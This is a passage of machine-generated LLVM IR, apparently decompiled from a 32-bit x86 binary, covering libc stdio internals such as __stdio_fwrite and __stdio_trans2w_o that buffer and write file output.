  %v0_8062110 = icmp slt i32 %v0_8062110.in, 0
  store i32 %v4_8062110, i32* @esi, align 4
  %v2_8062110 = icmp eq i1 %v0_8062110, false
  %v5_8062110 = select i1 %v2_8062110, i32 %v4_8062110, i32 2147483647
  store i32 %v5_8062110, i32* %eax.global-to-local, align 4
  %v1_8062115 = add i32 %v0_8062115, 4
  %v2_8062115 = inttoptr i32 %v1_8062115 to i32*
  %v3_8062115 = load i32, i32* %v2_8062115, align 4
  %v4_8062118 = call i32 @__libc_write(i32 %v3_8062115, i32 %v0_8062114, i32 %v5_8062110)
  store i32 %v4_8062118, i32* %eax.global-to-local, align 4
  %v1_8062120 = icmp eq i32 %v4_8062118, 0
  store i1 %v1_8062120, i1* %zf.global-to-local, align 1
  %v2_8062120 = icmp slt i32 %v4_8062118, 0
  br i1 %v2_8062120, label %dec_label_pc_806212a, label %dec_label_pc_8062124

dec_label_pc_8062124:                             ; preds = %dec_label_pc_8062108
  %v0_8062124 = load i32, i32* @ebx, align 4
  %v2_8062124 = sub i32 %v0_8062124, %v4_8062118
  %v12_8062124 = icmp eq i32 %v2_8062124, 0
  store i32 %v2_8062124, i32* @ebx, align 4
  %v0_8062126 = load i32, i32* @edi, align 4
  %v2_8062126 = add i32 %v0_8062126, %v4_8062118
  store i32 %v2_8062126, i32* @edi, align 4
  store i1 %v12_8062124, i1* %zf.global-to-local, align 1
  br i1 %v12_8062124, label %dec_label_pc_8062164, label %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge

dec_label_pc_8062124.dec_label_pc_8062108_crit_edge: ; preds = %dec_label_pc_8062124
  %v0_8062115.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8062108

dec_label_pc_806212a:                             ; preds = %dec_label_pc_8062108
  %v0_806212a = load i32, i32* @ebp, align 4
  %v1_806212a = inttoptr i32 %v0_806212a to i32*
  %v2_806212a = load i32, i32* %v1_806212a, align 4
  store i32 %v2_806212a, i32* %eax.global-to-local, align 4
  %v1_806212d = add i32 %v0_806212a, 8
  %v2_806212d = inttoptr i32 %v1_806212d to i32*
  %v3_806212d = load i32, i32* %v2_806212d, align 4
  store i32 %v3_806212d, i32* @edx, align 4
  %v1_8062130 = or i32 %v2_806212a, 8
  store i32 %v1_8062130, i32* %eax.global-to-local, align 4
  %v1_8062133 = trunc i32 %v1_8062130 to i16
  %v3_8062133 = inttoptr i32 %v0_806212a to i16*
  store i16 %v1_8062133, i16* %v3_8062133, align 2
  %v0_8062137 = load i32, i32* @ebp, align 4
  %v1_8062137 = add i32 %v0_8062137, 12
  %v2_8062137 = inttoptr i32 %v1_8062137 to i32*
  %v3_8062137 = load i32, i32* %v2_8062137, align 4
  %v1_806213a = load i32, i32* @edx, align 4
  %v2_806213a = sub i32 %v3_8062137, %v1_806213a
  %v12_806213a = icmp eq i32 %v2_806213a, 0
  store i1 %v12_806213a, i1* %zf.global-to-local, align 1
  store i32 %v2_806213a, i32* %eax.global-to-local, align 4
  %v4_8062160.pre = load i32, i32* @ebx, align 4
  br i1 %v12_806213a, label %dec_label_pc_8062160, label %dec_label_pc_806213e

dec_label_pc_806213e:                             ; preds = %dec_label_pc_806212a
  %v12_806213e = icmp eq i32 %v2_806213a, %v4_8062160.pre
  store i1 %v12_806213e, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_806213a, %v4_8062160.pre
  %v3_8062140 = load i32, i32* @esi, align 4
  %v5_8062140 = select i1 %tmp, i32 %v2_806213a, i32 %v3_8062140
  store i32 %v5_8062140, i32* %esi.global-to-local, align 4
  %v0_8062143.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8062143

dec_label_pc_8062143:                             ; preds = %dec_label_pc_8062155, %dec_label_pc_806213e
  %v2_8062147 = phi i32 [ %v1_8062151, %dec_label_pc_8062155 ], [ %v1_806213a, %dec_label_pc_806213e ]
  %v4_8062143 = phi i32 [ %v4_8062143.pre, %dec_label_pc_8062155 ], [ %v2_806213a, %dec_label_pc_806213e ]
  %v0_8062143 = phi i32 [ %v1_8062155, %dec_label_pc_8062155 ], [ %v0_8062143.pre, %dec_label_pc_806213e ]
  %v1_8062143 = inttoptr i32 %v0_8062143 to i8*
  %v2_8062143 = load i8, i8* %v1_8062143, align 1
  %v3_8062143 = zext i8 %v2_8062143 to i32
  %v5_8062143 = and i32 %v4_8062143, -256
  %v6_8062143 = or i32 %v3_8062143, %v5_8062143
  store i32 %v6_8062143, i32* %eax.global-to-local, align 4
  %v10_8062145 = icmp eq i8 %v2_8062143, 10
  store i1 %v10_8062145, i1* %zf.global-to-local, align 1
  %v3_8062147 = inttoptr i32 %v2_8062147 to i8*
  store i8 %v2_8062143, i8* %v3_8062147, align 1
  %v0_8062149 = load i1, i1* %zf.global-to-local, align 1
  %v1_8062149 = icmp eq i1 %v0_8062149, false
  br i1 %v1_8062149, label %dec_label_pc_8062151, label %dec_label_pc_806214b

dec_label_pc_806214b:                             ; preds = %dec_label_pc_8062143
  %v0_806214b = load i32, i32* @ebp, align 4
  %v1_806214b = add i32 %v0_806214b, 1
  %v2_806214b = inttoptr i32 %v1_806214b to i8*
  %v3_806214b = load i8, i8* %v2_806214b, align 1
  %v4_806214b = urem i8 %v3_806214b, 2
  %v5_806214b = icmp eq i8 %v4_806214b, 0
  store i1 %v5_806214b, i1* %zf.global-to-local, align 1
  %v1_806214f = icmp eq i1 %v5_806214b, false
  br i1 %v1_806214f, label %dec_label_pc_806214b.dec_label_pc_8062158_crit_edge, label %dec_label_pc_8062151

dec_label_pc_806214b.dec_label_pc_8062158_crit_edge: ; preds = %dec_label_pc_806214b
  %v0_8062158.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8062158

dec_label_pc_8062151:                             ; preds = %dec_label_pc_806214b, %dec_label_pc_8062143
  %v0_8062151 = load i32, i32* @edx, align 4
  %v1_8062151 = add i32 %v0_8062151, 1
  store i32 %v1_8062151, i32* @edx, align 4
  %v0_8062152 = load i32, i32* %esi.global-to-local, align 4
  %v1_8062152 = add i32 %v0_8062152, -1
  %v8_8062152 = icmp eq i32 %v1_8062152, 0
  store i1 %v8_8062152, i1* %zf.global-to-local, align 1
  store i32 %v1_8062152, i32* %esi.global-to-local, align 4
  br i1 %v8_8062152, label %dec_label_pc_8062151.dec_label_pc_8062158_crit_edge, label %dec_label_pc_8062155

dec_label_pc_8062151.dec_label_pc_8062158_crit_edge: ; preds = %dec_label_pc_8062151
  %v1_8062158.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8062158

dec_label_pc_8062155:                             ; preds = %dec_label_pc_8062151
  %v0_8062155 = load i32, i32* @edi, align 4
  %v1_8062155 = add i32 %v0_8062155, 1
  %v8_8062155 = icmp eq i32 %v1_8062155, 0
  store i1 %v8_8062155, i1* %zf.global-to-local, align 1
  store i32 %v1_8062155, i32* @edi, align 4
  %v4_8062143.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062143

dec_label_pc_8062158:                             ; preds = %dec_label_pc_8062151.dec_label_pc_8062158_crit_edge, %dec_label_pc_806214b.dec_label_pc_8062158_crit_edge
  %v1_8062158 = phi i32 [ %v0_806214b, %dec_label_pc_806214b.dec_label_pc_8062158_crit_edge ], [ %v1_8062158.pre, %dec_label_pc_8062151.dec_label_pc_8062158_crit_edge ]
  %v0_8062158 = phi i32 [ %v0_8062158.pre, %dec_label_pc_806214b.dec_label_pc_8062158_crit_edge ], [ %v1_8062151, %dec_label_pc_8062151.dec_label_pc_8062158_crit_edge ]
  %v2_8062158 = add i32 %v1_8062158, 16
  %v3_8062158 = inttoptr i32 %v2_8062158 to i32*
  store i32 %v0_8062158, i32* %v3_8062158, align 4
  %v0_806215b = load i32, i32* @edx, align 4
  %v1_806215b = load i32, i32* @ebp, align 4
  %v2_806215b = add i32 %v1_806215b, 8
  %v3_806215b = inttoptr i32 %v2_806215b to i32*
  %v4_806215b = load i32, i32* %v3_806215b, align 4
  %v5_806215b = sub i32 %v0_806215b, %v4_806215b
  store i32 %v5_806215b, i32* @edx, align 4
  %v0_806215e = load i32, i32* @ebx, align 4
  %v2_806215e = sub i32 %v0_806215e, %v5_806215b
  %v12_806215e = icmp eq i32 %v2_806215e, 0
  store i1 %v12_806215e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8062160

dec_label_pc_8062160:                             ; preds = %dec_label_pc_806212a, %dec_label_pc_8062158
  %v4_8062160 = phi i32 [ %v2_806215e, %dec_label_pc_8062158 ], [ %v4_8062160.pre, %dec_label_pc_806212a ]
  %v5_8062160 = sub i32 %arg3, %v4_8062160
  %v15_8062160 = icmp eq i32 %v5_8062160, 0
  store i1 %v15_8062160, i1* %zf.global-to-local, align 1
  %v0_8062168.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8062164

dec_label_pc_8062164:                             ; preds = %dec_label_pc_8062124, %entry, %dec_label_pc_8062160
  %v0_8062168 = phi i32 [ %v0_8062168.pre, %dec_label_pc_8062160 ], [ %v15_80620f4, %entry ], [ %v15_80620f4, %dec_label_pc_8062124 ]
  %stack_var_12.0 = phi i32 [ %v5_8062160, %dec_label_pc_8062160 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8062124 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8062168 = icmp eq i32 %v0_8062168, -12
  store i1 %v9_8062168, i1* %zf.global-to-local, align 1
  store i32 %v0_80620f3, i32* @ebx, align 4
  store i32 %v0_80620f2, i32* @esi, align 4
  store i32 %v0_80620f1, i32* @edi, align 4
  store i32 %v0_80620f0, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8062155, { 1, 2, 0 }
  uselistorder i32 %v1_8062152, { 1, 0 }
  uselistorder i32 %v1_8062151, { 0, 2, 1 }
  uselistorder i8 %v2_8062143, { 1, 0, 2 }
  uselistorder i32 %v4_8062160.pre, { 2, 0, 1 }
  uselistorder i32 %v2_806213a, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8062126, { 1, 0 }
  uselistorder i32 %v2_8062124, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8062118, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 2, 11, 10, 9, 1, 0, 5, 4, 8, 3, 7, 12, 6 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8062164, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062160, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8062170 = load i32, i32* @ebp, align 4
  %v0_8062171 = load i32, i32* @edi, align 4
  %v0_8062172 = load i32, i32* @esi, align 4
  %v0_8062173 = load i32, i32* @ebx, align 4
  store i32 %v0_8062173, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8062183 = add i32 %arg3, 1
  %v2_8062183 = inttoptr i32 %v1_8062183 to i8*
  %v3_8062183 = load i8, i8* %v2_8062183, align 1
  %v4_8062183 = and i8 %v3_8062183, 2
  %v5_8062183 = icmp eq i8 %v4_8062183, 0
  %v1_8062187 = icmp eq i1 %v5_8062183, false
  br i1 %v1_8062187, label %dec_label_pc_8062238, label %dec_label_pc_806218d

dec_label_pc_806218d:                             ; preds = %entry
  %v1_806218d = add i32 %arg3, 4
  %v2_806218d = inttoptr i32 %v1_806218d to i32*
  %v3_806218d = load i32, i32* %v2_806218d, align 4
  %v13_806218d = icmp eq i32 %v3_806218d, -2
  %v1_8062191 = add i32 %arg3, 16
  %v2_8062191 = inttoptr i32 %v1_8062191 to i32*
  %v3_8062191 = load i32, i32* %v2_8062191, align 4
  store i32 %v3_8062191, i32* @edx, align 4
  %v1_8062194 = add i32 %arg3, 12
  %v2_8062194 = inttoptr i32 %v1_8062194 to i32*
  %v3_8062194 = load i32, i32* %v2_8062194, align 4
  store i32 %v3_8062194, i32* %eax.global-to-local, align 4
  %v1_8062197 = icmp eq i1 %v13_806218d, false
  %v2_80621b6 = sub i32 %v3_8062194, %v3_8062191
  br i1 %v1_8062197, label %dec_label_pc_80621b6, label %dec_label_pc_8062199

dec_label_pc_8062199:                             ; preds = %dec_label_pc_806218d
  %tmp = icmp uge i32 %v2_80621b6, %arg2
  %v5_80621a0 = select i1 %tmp, i32 %arg2, i32 %v2_80621b6
  store i32 %v5_80621a0, i32* %ebx.global-to-local, align 4
  %v3_80621a6 = inttoptr i32 %v3_8062191 to i16*
  %v4_80621a6 = call i32 @memcpy(i16* %v3_80621a6, i32 %v5_80621a0, i32 %v3_8062194)
  store i32 %v4_80621a6, i32* %eax.global-to-local, align 4
  %v0_80621ae = load i32, i32* @esi, align 4
  %v1_80621ae = add i32 %v0_80621ae, 16
  %v2_80621ae = inttoptr i32 %v1_80621ae to i32*
  %v3_80621ae = load i32, i32* %v2_80621ae, align 4
  %v4_80621ae = load i32, i32* %ebx.global-to-local, align 4
  %v5_80621ae = add i32 %v4_80621ae, %v3_80621ae
  store i32 %v5_80621ae, i32* %v2_80621ae, align 4
  br label %dec_label_pc_8062250

dec_label_pc_80621b6:                             ; preds = %dec_label_pc_806218d
  store i32 %v2_80621b6, i32* %eax.global-to-local, align 4
  %v6_80621ba = icmp ult i32 %v2_80621b6, %arg2
  br i1 %v6_80621ba, label %dec_label_pc_806221f, label %dec_label_pc_80621bc

dec_label_pc_80621bc:                             ; preds = %dec_label_pc_80621b6
  %v0_80621bc = load i32, i32* @ecx, align 4
  %v3_80621c0 = inttoptr i32 %v3_8062191 to i16*
  %v4_80621c0 = call i32 @memcpy(i16* %v3_80621c0, i32 %arg2, i32 %v0_80621bc)
  store i32 %v4_80621c0, i32* %eax.global-to-local, align 4
  %v0_80621c8 = load i32, i32* @esi, align 4
  %v1_80621c8 = add i32 %v0_80621c8, 16
  %v2_80621c8 = inttoptr i32 %v1_80621c8 to i32*
  %v3_80621c8 = load i32, i32* %v2_80621c8, align 4
  %v4_80621c8 = load i32, i32* @edi, align 4
  %v5_80621c8 = add i32 %v4_80621c8, %v3_80621c8
  store i32 %v5_80621c8, i32* %v2_80621c8, align 4
  %v0_80621cb = load i32, i32* @esi, align 4
  %v1_80621cb = add i32 %v0_80621cb, 1
  %v2_80621cb = inttoptr i32 %v1_80621cb to i8*
  %v3_80621cb = load i8, i8* %v2_80621cb, align 1
  %v4_80621cb = urem i8 %v3_80621cb, 2
  %v5_80621cb = icmp eq i8 %v4_80621cb, 0
  br i1 %v5_80621cb, label %dec_label_pc_8062250, label %dec_label_pc_80621d1

dec_label_pc_80621d1:                             ; preds = %dec_label_pc_80621bc
  %v0_80621d1 = load i32, i32* @edx, align 4
  %v0_80621d2 = load i32, i32* @edi, align 4
  %v4_80621d6 = call i32 @memrchr(i8 10, i32 %v0_80621d2, i32 %v0_80621d1)
  store i32 %v4_80621d6, i32* %eax.global-to-local, align 4
  %v1_80621de = icmp eq i32 %v4_80621d6, 0
  br i1 %v1_80621de, label %dec_label_pc_8062250, label %dec_label_pc_80621e2

dec_label_pc_80621e2:                             ; preds = %dec_label_pc_80621d1
  %v0_80621e5 = load i32, i32* @esi, align 4
  %v1_80621e6 = call i32 @__stdio_wcommit(i32 %v0_80621e5)
  store i32 %v1_80621e6, i32* %eax.global-to-local, align 4
  %v1_80621ee = icmp eq i32 %v1_80621e6, 0
  br i1 %v1_80621ee, label %dec_label_pc_8062250, label %dec_label_pc_80621f2

dec_label_pc_80621f2:                             ; preds = %dec_label_pc_80621e2
  %v0_80621f2 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80621f2, %v1_80621e6
  %v5_80621f6 = select i1 %tmp20, i32 %v0_80621f2, i32 %v1_80621e6
  store i32 %v5_80621f6, i32* %ebx.global-to-local, align 4
  %v2_80621fb = sub i32 %v0_80621f2, %v5_80621f6
  store i32 %v2_80621fb, i32* %eax.global-to-local, align 4
  %v0_80621fd = load i32, i32* @ebp, align 4
  %v2_80621fd = add i32 %v0_80621fd, %v2_80621fb
  store i32 %v2_80621fd, i32* %ebp.global-to-local, align 4
  %v4_8062204 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80621f6, i32 %v2_80621fb)
  store i32 %v4_8062204, i32* %eax.global-to-local, align 4
  %v1_806220c = icmp eq i32 %v4_8062204, 0
  store i32 %v4_8062204, i32* @edx, align 4
  br i1 %v1_806220c, label %dec_label_pc_8062250, label %dec_label_pc_8062212

dec_label_pc_8062212:                             ; preds = %dec_label_pc_80621f2
  %v0_8062212 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8062212 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062212 = sub i32 %v0_8062212, %v4_8062204
  %v2_8062216 = add i32 %v2_8062212, %v1_8062212
  store i32 %v2_8062216, i32* %eax.global-to-local, align 4
  %v0_8062218 = load i32, i32* @esi, align 4
  %v1_8062218 = add i32 %v0_8062218, 16
  %v2_8062218 = inttoptr i32 %v1_8062218 to i32*
  %v3_8062218 = load i32, i32* %v2_8062218, align 4
  %v5_8062218 = sub i32 %v3_8062218, %v2_8062216
  store i32 %v5_8062218, i32* %v2_8062218, align 4
  %v0_806221b = load i32, i32* @edi, align 4
  %v1_806221b = load i32, i32* %eax.global-to-local, align 4
  %v2_806221b = sub i32 %v0_806221b, %v1_806221b
  store i32 %v2_806221b, i32* @edi, align 4
  br label %dec_label_pc_8062250

dec_label_pc_806221f:                             ; preds = %dec_label_pc_80621b6
  %v2_806221f = add i32 %arg3, 8
  %v3_806221f = inttoptr i32 %v2_806221f to i32*
  %v4_806221f = load i32, i32* %v3_806221f, align 4
  %v15_806221f = icmp eq i32 %v3_8062191, %v4_806221f
  br i1 %v15_806221f, label %dec_label_pc_8062238, label %dec_label_pc_8062224

dec_label_pc_8062224:                             ; preds = %dec_label_pc_806221f
  %v1_8062228 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8062228, i32* %eax.global-to-local, align 4
  %v1_8062230 = icmp eq i32 %v1_8062228, 0
  br i1 %v1_8062230, label %dec_label_pc_8062224.dec_label_pc_8062238_crit_edge, label %dec_label_pc_8062234

dec_label_pc_8062224.dec_label_pc_8062238_crit_edge: ; preds = %dec_label_pc_8062224
  %v0_8062238.pre = load i32, i32* @edi, align 4
  %v0_8062240.pre = load i32, i32* @esi, align 4
  %v2_8062247.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8062238

dec_label_pc_8062234:                             ; preds = %dec_label_pc_8062224
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8062250

dec_label_pc_8062238:                             ; preds = %dec_label_pc_8062224.dec_label_pc_8062238_crit_edge, %dec_label_pc_806221f, %entry
  %v2_8062247 = phi i32 [ %v2_8062247.pre, %dec_label_pc_8062224.dec_label_pc_8062238_crit_edge ], [ %v0_8062173, %dec_label_pc_806221f ], [ %v0_8062173, %entry ]
  %v0_8062240 = phi i32 [ %v0_8062240.pre, %dec_label_pc_8062224.dec_label_pc_8062238_crit_edge ], [ %arg3, %dec_label_pc_806221f ], [ %arg3, %entry ]
  %v0_8062238 = phi i32 [ %v0_8062238.pre, %dec_label_pc_8062224.dec_label_pc_8062238_crit_edge ], [ %arg2, %dec_label_pc_806221f ], [ %arg2, %entry ]
  store i32 %v2_8062247, i32* @ebx, align 4
  store i32 %v0_8062172, i32* @esi, align 4
  store i32 %v0_8062171, i32* @edi, align 4
  store i32 %v0_8062170, i32* @ebp, align 4
  %v4_806224b = inttoptr i32 %v0_8062240 to i16*
  %v5_806224b = call i32 @__stdio_WRITE(i16* %v4_806224b, i32 %v0_8062238, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806224b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062250

dec_label_pc_8062250:                             ; preds = %dec_label_pc_80621f2, %dec_label_pc_80621e2, %dec_label_pc_80621d1, %dec_label_pc_80621bc, %dec_label_pc_8062234, %dec_label_pc_8062212, %dec_label_pc_8062199, %dec_label_pc_8062238
  %v0_8062253 = load i32, i32* @edi, align 4
  store i32 %v0_8062253, i32* %eax.global-to-local, align 4
  %v2_8062255 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062255, i32* @ebx, align 4
  store i32 %v0_8062172, i32* @esi, align 4
  store i32 %v0_8062171, i32* @edi, align 4
  store i32 %v0_8062170, i32* @ebp, align 4
  ret i32 %v0_8062253

; uselistorder directives
  uselistorder i32 %v2_8062216, { 1, 0 }
  uselistorder i32 %v0_80621f2, { 2, 1, 0 }
  uselistorder i32 %v1_80621e6, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80621b6, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8062191, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8062172, { 1, 0 }
  uselistorder i32 %v0_8062171, { 1, 0 }
  uselistorder i32 %v0_8062170, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8062250, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_806225c = load i32, i32* @ebx, align 4
  %v4_8062260 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8062260, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8062268 = load i16, i16* %arg1, align 2
  %v3_8062268 = zext i16 %v2_8062268 to i32
  store i32 %v3_8062268, i32* %eax.global-to-local, align 4
  %v2_806226b = and i32 %v3_8062268, %arg2
  %v3_806226b = icmp eq i32 %v2_806226b, 0
  %v1_806226d = icmp eq i1 %v3_806226b, false
  br i1 %v1_806226d, label %dec_label_pc_806227b, label %dec_label_pc_806226f

dec_label_pc_806226f:                             ; preds = %entry
  %v1_806226f = and i32 %v3_8062268, 2176
  %v2_806226f = icmp eq i32 %v1_806226f, 0
  %v1_8062274 = icmp eq i1 %v2_806226f, false
  br i1 %v1_8062274, label %dec_label_pc_8062283, label %dec_label_pc_8062276

dec_label_pc_8062276:                             ; preds = %dec_label_pc_806226f
  %v2_8062276 = or i32 %v3_8062268, %arg2
  store i32 %v2_8062276, i32* %eax.global-to-local, align 4
  %v1_8062278 = trunc i32 %v2_8062276 to i16
  store i16 %v1_8062278, i16* %arg1, align 2
  %v0_806227b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806227b

dec_label_pc_806227b:                             ; preds = %entry, %dec_label_pc_8062276
  %v0_80622c4 = phi i32 [ %v4_8062260, %entry ], [ %v0_806227b.pre, %dec_label_pc_8062276 ]
  %v1_806227b = inttoptr i32 %v0_80622c4 to i16*
  %v2_806227b = load i16, i16* %v1_806227b, align 2
  %v3_806227b = zext i16 %v2_806227b to i32
  store i32 %v3_806227b, i32* %edx.global-to-local, align 4
  %v2_806227e = and i16 %v2_806227b, 32
  %v3_806227e = icmp eq i16 %v2_806227e, 0
  br i1 %v3_806227e, label %dec_label_pc_806229b, label %dec_label_pc_8062283

dec_label_pc_8062283:                             ; preds = %dec_label_pc_806227b, %dec_label_pc_806226f
  %v1_8062283 = call i32 @__errno_location(i32 %v0_806225c)
  store i32 %v1_8062283, i32* %eax.global-to-local, align 4
  %v1_8062288 = inttoptr i32 %v1_8062283 to i32*
  store i32 9, i32* %v1_8062288, align 4
  br label %dec_label_pc_806228e

dec_label_pc_806228e:                             ; preds = %dec_label_pc_80622b2, %dec_label_pc_8062283
  %v0_806228e = load i32, i32* @ebx, align 4
  %v1_806228e = inttoptr i32 %v0_806228e to i32*
  %v2_806228e = load i32, i32* %v1_806228e, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8062293 = or i32 %v2_806228e, 8
  store i32 %v1_8062293, i32* %eax.global-to-local, align 4
  %v1_8062296 = trunc i32 %v1_8062293 to i16
  %v3_8062296 = inttoptr i32 %v0_806228e to i16*
  store i16 %v1_8062296, i16* %v3_8062296, align 2
  br label %dec_label_pc_80622fd

dec_label_pc_806229b:                             ; preds = %dec_label_pc_806227b
  %v2_806229b = urem i16 %v2_806227b, 4
  %v3_806229b = icmp eq i16 %v2_806229b, 0
  br i1 %v3_806229b, label %dec_label_pc_80622e5, label %dec_label_pc_80622a0

dec_label_pc_80622a0:                             ; preds = %dec_label_pc_806229b
  %v2_80622a0 = and i32 %v3_806227b, 4
  %v3_80622a0 = icmp eq i32 %v2_80622a0, 0
  %v1_80622a3 = icmp eq i1 %v3_80622a0, false
  br i1 %v1_80622a3, label %dec_label_pc_80622d1, label %dec_label_pc_80622a5

dec_label_pc_80622a5:                             ; preds = %dec_label_pc_80622a0
  %v1_80622a5 = add i32 %v0_80622c4, 20
  %v2_80622a5 = inttoptr i32 %v1_80622a5 to i32*
  %v3_80622a5 = load i32, i32* %v2_80622a5, align 4
  store i32 %v3_80622a5, i32* %eax.global-to-local, align 4
  %v2_80622a8 = add i32 %v0_80622c4, 16
  %v3_80622a8 = inttoptr i32 %v2_80622a8 to i32*
  %v4_80622a8 = load i32, i32* %v3_80622a8, align 4
  %v15_80622a8 = icmp eq i32 %v3_80622a5, %v4_80622a8
  %v1_80622ab = icmp eq i1 %v15_80622a8, false
  br i1 %v1_80622ab, label %dec_label_pc_80622b2, label %dec_label_pc_80622ad

dec_label_pc_80622ad:                             ; preds = %dec_label_pc_80622a5
  %v2_80622ad = and i32 %v3_806227b, 2
  %v3_80622ad = icmp eq i32 %v2_80622ad, 0
  br i1 %v3_80622ad, label %dec_label_pc_80622d1, label %dec_label_pc_80622b2

dec_label_pc_80622b2:                             ; preds = %dec_label_pc_80622ad, %dec_label_pc_80622a5
  %v1_80622b2 = and i32 %v3_806227b, 1024
  store i32 %v1_80622b2, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_80622b2, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_80622c5 = call i32 @__GI_fseek(i32 %v0_80622c4, i32 0, i32 %tmp18, i32 %v1_80622b2)
  store i32 %v5_80622c5, i32* %eax.global-to-local, align 4
  %v1_80622cd = icmp eq i32 %v5_80622c5, 0
  %v1_80622cf = icmp eq i1 %v1_80622cd, false
  br i1 %v1_80622cf, label %dec_label_pc_806228e, label %dec_label_pc_80622b2.dec_label_pc_80622d1_crit_edge

dec_label_pc_80622b2.dec_label_pc_80622d1_crit_edge: ; preds = %dec_label_pc_80622b2
  %v0_80622d1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80622d1

dec_label_pc_80622d1:                             ; preds = %dec_label_pc_80622b2.dec_label_pc_80622d1_crit_edge, %dec_label_pc_80622ad, %dec_label_pc_80622a0
  %v2_80622d6 = phi i32 [ %v0_80622d1.pre, %dec_label_pc_80622b2.dec_label_pc_80622d1_crit_edge ], [ %v0_80622c4, %dec_label_pc_80622ad ], [ %v0_80622c4, %dec_label_pc_80622a0 ]
  %v1_80622d1 = inttoptr i32 %v2_80622d6 to i32*
  %v2_80622d1 = load i32, i32* %v1_80622d1, align 4
  %v1_80622d3 = and i32 %v2_80622d1, -4
  store i32 %v1_80622d3, i32* %eax.global-to-local, align 4
  %v1_80622d6 = trunc i32 %v1_80622d3 to i16
  %v3_80622d6 = inttoptr i32 %v2_80622d6 to i16*
  store i16 %v1_80622d6, i16* %v3_80622d6, align 2
  %v0_80622d9 = load i32, i32* @ebx, align 4
  %v1_80622d9 = add i32 %v0_80622d9, 8
  %v2_80622d9 = inttoptr i32 %v1_80622d9 to i32*
  %v3_80622d9 = load i32, i32* %v2_80622d9, align 4
  store i32 %v3_80622d9, i32* %eax.global-to-local, align 4
  %v2_80622dc = add i32 %v0_80622d9, 24
  %v3_80622dc = inttoptr i32 %v2_80622dc to i32*
  store i32 %v3_80622d9, i32* %v3_80622dc, align 4
  %v0_80622df = load i32, i32* %eax.global-to-local, align 4
  %v1_80622df = load i32, i32* @ebx, align 4
  %v2_80622df = add i32 %v1_80622df, 16
  %v3_80622df = inttoptr i32 %v2_80622df to i32*
  store i32 %v0_80622df, i32* %v3_80622df, align 4
  %v0_80622e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80622e2 = load i32, i32* @ebx, align 4
  %v2_80622e2 = add i32 %v1_80622e2, 20
  %v3_80622e2 = inttoptr i32 %v2_80622e2 to i32*
  store i32 %v0_80622e2, i32* %v3_80622e2, align 4
  %v0_80622e5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80622e5

dec_label_pc_80622e5:                             ; preds = %dec_label_pc_806229b, %dec_label_pc_80622d1
  %v2_80622ec = phi i32 [ %v0_80622c4, %dec_label_pc_806229b ], [ %v0_80622e5.pre, %dec_label_pc_80622d1 ]
  %v1_80622e5 = inttoptr i32 %v2_80622ec to i32*
